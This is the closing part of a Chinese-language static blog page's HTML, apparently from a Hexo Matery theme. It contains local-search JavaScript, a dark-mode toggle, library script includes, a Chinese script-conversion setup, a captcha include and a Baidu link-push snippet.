                var datas = $("entry", xmlResponse).map(function () {
                    return {
                        title: $("title", this).text(),
                        content: $("content", this).text(),
                        url: $("url", this).text()
                    };
                }).get();
                var $input = document.getElementById(search_id);
                var $resultContent = document.getElementById(content_id);
                $input.addEventListener('input', function () {
                    var str = '<ul class=\"search-result-list\">';
                    var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
                    $resultContent.innerHTML = "";
                    if (this.value.trim().length <= 0) {
                        return;
                    }
                    // perform local searching
                    datas.forEach(function (data) {
                        var isMatch = true;
                        var data_title = data.title.trim().toLowerCase();
                        var data_content = data.content.trim().replace(/<[^>]+>/g, "").toLowerCase();
                        var data_url = data.url;
                        data_url = data_url.indexOf('/') === 0 ? data.url : '/' + data_url;
                        var index_title = -1;
                        var index_content = -1;
                        var first_occur = -1;
                        // only match artiles with not empty titles and contents
                        if (data_title !== '' && data_content !== '') {
                            keywords.forEach(function (keyword, i) {
                                index_title = data_title.indexOf(keyword);
                                index_content = data_content.indexOf(keyword);
                                if (index_title < 0 && index_content < 0) {
                                    isMatch = false;
                                } else {
                                    if (index_content < 0) {
                                        index_content = 0;
                                    }
                                    if (i === 0) {
                                        first_occur = index_content;
                                    }
                                }
                            });
                        }
                        // show search results
                        if (isMatch) {
                            str += "<li><a href='" + data_url + "' class='search-result-title'>" + data_title + "</a>";
                            var content = data.content.trim().replace(/<[^>]+>/g, "");
                            if (first_occur >= 0) {
                                // cut out 100 characters
                                var start = first_occur - 20;
                                var end = first_occur + 80;
                                if (start < 0) {
                                    start = 0;
                                }
                                if (start === 0) {
                                    end = 100;
                                }
                                if (end > content.length) {
                                    end = content.length;
                                }
                                var match_content = content.substr(start, end);
                                // highlight all keywords
                                keywords.forEach(function (keyword) {
                                    var regS = new RegExp(keyword, "gi");
                                    match_content = match_content.replace(regS, "<em class=\"search-keyword\">" + keyword + "</em>");
                                });

                                str += "<p class=\"search-result\">" + match_content + "...</p>"
                            }
                            str += "</li>";
                        }
                    });
                    str += "</ul>";
                    $resultContent.innerHTML = str;
                });
            }
        });
    };

    searchFunc('/search.xml', 'searchInput', 'searchResult');
});
</script>

    <!-- 白天和黑夜主题 -->
<div class="stars-con">
    <div id="stars"></div>
    <div id="stars2"></div>
    <div id="stars3"></div>  
</div>

<script>
    function switchNightMode() {
        $('<div class="Cuteen_DarkSky"><div class="Cuteen_DarkPlanet"></div></div>').appendTo($('body')),
        setTimeout(function () {
            $('body').hasClass('DarkMode') 
            ? ($('body').removeClass('DarkMode'), localStorage.setItem('isDark', '0'), $('#sum-moon-icon').removeClass("fa-sun").addClass('fa-moon')) 
            : ($('body').addClass('DarkMode'), localStorage.setItem('isDark', '1'), $('#sum-moon-icon').addClass("fa-sun").removeClass('fa-moon')),
            
            setTimeout(function () {
            $('.Cuteen_DarkSky').fadeOut(1e3, function () {
                $(this).remove()
            })
            }, 2e3)
        })
    }
</script>

    <!-- 回到顶部按钮 -->
<div id="backTop" class="top-scroll">
    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
        <i class="fas fa-arrow-up"></i>
    </a>
</div>


    <script src="/libs/materialize/materialize.min.js"></script>
    <script src="/libs/masonry/masonry.pkgd.min.js"></script>
    <script src="/libs/aos/aos.js"></script>
    <script src="/libs/scrollprogress/scrollProgress.min.js"></script>
    <script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
    <script src="/js/matery.js"></script>

    

    
        <script type="text/javascript" src="/js/tw_cn.js"></script>
        <script type="text/javascript">
          var defaultEncoding = 2; //网站编写字体是否繁体，1-繁体，2-简体
          var translateDelay = 0; //延迟时间,若不在前, 要设定延迟翻译时间, 如100表示100ms,默认为0
          var cookieDomain = "https://topk-li.github.io"; //Cookie地址, 一定要设定, 通常为你的网址
          var msgToTraditionalChinese = "繁"; //此处可以更改为你想要显示的文字
          var msgToSimplifiedChinese = "简"; //同上，但两处均不建议更改
          var translateButtonId = "translateLink"; //默认互换id
          translateInitilization();
        </script>
    
    
    

    <!-- 雪花特效 -->
    

    <!-- 鼠标星星特效 -->
    

     
        <script src="https://ssl.captcha.qq.com/TCaptcha.js"></script>
        <script src="/libs/others/TencentCaptcha.js"></script>
        <button id="TencentCaptcha" data-appid="xxxxxxxxxx" data-cbfn="callback" type="button" hidden></button>
    

    <!-- Baidu Analytics -->

    <!-- Baidu Push -->

<script>
    (function () {
        var bp = document.createElement('script');
        var curProtocol = window.location.protocol.split(':')[0];
        if (curProtocol === 'https') {
            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
        } else {
            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
        }
        var s = document.getElementsByTagName("script")[0];
        s.parentNode.insertBefore(bp, s);
    })();
</script>

    
    <script src="/libs/others/clicklove.js" async="async"></script>
    
    
    <script async src="/libs/others/busuanzi.pure.mini.js"></script>
    

    

    

    <!--腾讯兔小巢-->
    
    

    

    

    
    <script src="/libs/instantpage/instantpage.js" type="module"></script>
    

</body>

</html>
